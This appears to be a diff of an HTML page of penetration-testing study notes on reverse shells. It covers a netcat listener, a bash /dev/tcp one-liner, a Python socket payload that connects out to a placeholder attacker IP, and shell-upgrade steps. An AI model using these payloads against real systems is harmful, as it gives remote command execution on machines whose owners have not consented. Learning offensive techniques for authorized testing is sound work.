@@ -9,91 +9,84 @@
     <link rel="stylesheet" type="text/css" href="styles.css">
     <script src="displayTools.js"></script>
     <a href="index.html">Return to Index</a>
+    <style>.colored-list li {color:#ff5555} .colored-list ul li {color:white}</style>
+
 </head>
 
 <body>
     <h1>Reverse-Shells</h1>
-    <br>
 
-    <p>Here we will be discussing Reverse-Shells.</p>
-    <br>
+        <h2>Listener</h2>
+            <p>The first thing we need to do is establish a way for our attacking host to interact with the target host by setting up a listener.
+            <br>
+                A listener does what it name suggests: listens for incoming traffic from a shell planted on a target host over a specific and user defined port. 
+            </p>
+            <br>
 
-    <p>Very basically, a Reverse-Shell is a way for us to execute commands using the target machines own shell.</p>
-    <br>
+            <p>There are many ways to set up a listener, but the easiest and most widely used method involves using Netcat, with a simple command like</p>
+            <code>nc -lvnp 4444</code>
+            <ul>
+                <li>nc: netcat</li>
+                <li>-l: listen</li>
+                <li>-v: verbose</li>
+                <li>-n: numeric-only IP addresses, no DNS</li>
+                <li>-p: local port number</li>
+                <li>4444: example port number to listen on</li>
+            </ul>
 
-    <h2>Listener</h2> <!-- Added header two for listener -->
-    <br>
 
-    <p>The first thing we need to do is establish a way for our computer to interact with the target machine. 
-        We accomplish this by setting up a listener on our machine. 
-        A listener is going to listen, and await an incoming session request over a specific and user defined port. 
-        The request we will be listening for is going to come from the target machine.</p>
-    <br>
-
-    <p>The command to start our listener will be:</p>
-    <p>nc -lvnp 4321</p>
-    <p>-nc: netcat</p>
-    <p>-l: listen</p>
-    <p>-v: verbose</p>
-    <p>-n: numeric-only IP addresses, no DNS</p>
-    <p>-p: local port number</p>
-    <p>1234: example port number to listen on</p>
-    <br>
-
-    <p>Once we have a listener set up, we need to get the target machine to send us a request.
-        We accomplish this by executing a command on the target machine that will connect to our listener. 
-        This command will be different depending on the type of listener we have set up.</p>
-    <br>
-
-    <p>Once we have a connection, we will be able to execute commands on the target machine using the target machines own shell.</p>
-    <br>
-
-    <h2>Reverse-Shells</h2>
-    <br>
-
-    <p>There are many different ways to get a Reverse-Shell, and we will be discussing a few of them here.</p>
-    <br>
-
-    <p>Perhaps the most common way to get a reverse shell is by executing the following command.</p>
-    <p>bash -i >& /dev/tcp/1.2.3.4/4321 0>&1</p>
-    <br>
-
-    <p>This command is used to create a reverse shell from a target machine back to an attacker's machine. Here's a breakdown of what each part does:</p>
-    <p>bash -i: This starts a new interactive bash shell. The -i flag stands for interactive, meaning it can take commands from the user.</p>
-    <p>>&: This is a redirection operator in bash. It redirects both stdout (standard output) and stderr (standard error) to the specified location.</p>
-    <p>/dev/tcp/1.2.3.4/4321: This is a special file that bash can interpret as a TCP connection. 1.2.3.4 should be replaced with the IP address of the attacker's machine (the machine that is listening for the connection), and 4321 should be replaced with the port number that the attacker's machine is listening on.</p>
-    <p>0>&1: This is another redirection. It redirects stdin (standard input) to wherever stdout is currently going. In this case, it's redirecting stdin to the TCP connection, allowing the attacker to send commands to the target machine.</p>
-    <p>So, in summary, this command starts a new bash shell on the target machine, and redirects all input and output to a TCP connection with the attacker's machine. This allows the attacker to send commands to the target machine and see the output of those commands.</p>
-    <br>
+        <h2>Reverse-Shells</h2>
+            <p>Once the target machine has been initially compromised, we want to set up a reverse shell to our attacker host to perform further actions in the target environment.</p>
+            <p>As with listeners, there are many ways to call out to a listener from a target host</p>
+            <ul class="colored-list" style="list-style-type: none">
+                <li>Netcat</li>
+                    <br>
+                <li>Bash</li>
+                    <p><code>bash -i >& /dev/tcp/1.2.3.4/4321 0>&1</code></p>
+                    <ul class="none">
+                        <li>-i: interactive</li>
+                        <li>>&: redirect stdout and stderr to specified location</li>
+                        <li>/dev/tcp/192.168.1.1/4444 0>&1: redirect stdin to TCP connection to attacker IP and port</li>
+                    </ul>
+                    <br>
+                <li>Python</li>
+<pre><code>import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.0.1",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])</code></pre>
+                    <br>
+                <li>Telnet</li>
+                    <br>
+            </ul>
 
 
 
-    <p>Another method of establishing a reverse shell is by leveraging an interpreted language such as Python.</p>
-    <p>Here is an example payload for Python 2.7 and beyond:</p>
-
-    <p>import socket,subprocess,os</p>
-    <p>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</p>
-    <p>s.connect(("10.0.0.1",1234))</p>
-    <p>os.dup2(s.fileno(),0)</p>
-    <p>os.dup2(s.fileno(),1)</p>
-    <p>os.dup2(s.fileno(),2)</p>
-    <p>p=subprocess.call(["/bin/sh","-i"])</p>
-    
+            
+            <h3>Upgrading the Shell</h3>
+            <p>Once our reverse shell has been established via our listener, we will want to upgrade our shell so we can have access to all the comfort features of modern shells.</p>
+            to do this, we will use the following command followed by a few others:
+            <p>python -c 'import pty; pty.spawn("/bin/bash")'</p>
+            <p>ctrl+z</p>
+            <p>stty raw -echo</p>
+            <p>fg</p>
+            <p>export TERM=xterm</p>
 
 
-    <p>Once our reverse shell has been established via our listener, we will want to upgrade our shell so we can have access to all the comfort features of modern shells.</p>
-    to do this, we will use the following command followed by a few others:
-    <p>python -c 'import pty; pty.spawn("/bin/bash")'</p>
-    <p>ctrl+z</p>
-    <p>stty raw -echo</p>
-    <p>fg</p>
-    <p>export TERM=xterm</p>
+            <p>TODO: populate this page with scanning tips and techniques - things such as combining masscan and nmap to get faster scans, or advanced nmap scripts to automate a lot of stuff</p>
+            <p>Reference useful tools like autorecon and others to help ease the scanning process</p>
+            <br>
 
+        <h2>Walkthrough</h2>
+            <p>Once we have a listener set up, we need to get the target machine to send us a request.
+                We accomplish this by executing a command on the target machine that will connect to our listener. 
+                This command will be different depending on the type of listener we have set up.</p>
+            <br>
 
-    <p>TODO: populate this page with scanning tips and techniques - things such as combining masscan and nmap to get faster scans, or advanced nmap scripts to automate a lot of stuff</p>
-    <p>Reference useful tools like autorecon and others to help ease the scanning process</p>
-    <br>
-
+            <p>Once we have a connection, we will be able to execute commands on the target machine using the target machines own shell.</p>
+            <br>
     <!-- Add your content here -->
 
     <script src="populateScanning.js"></script>
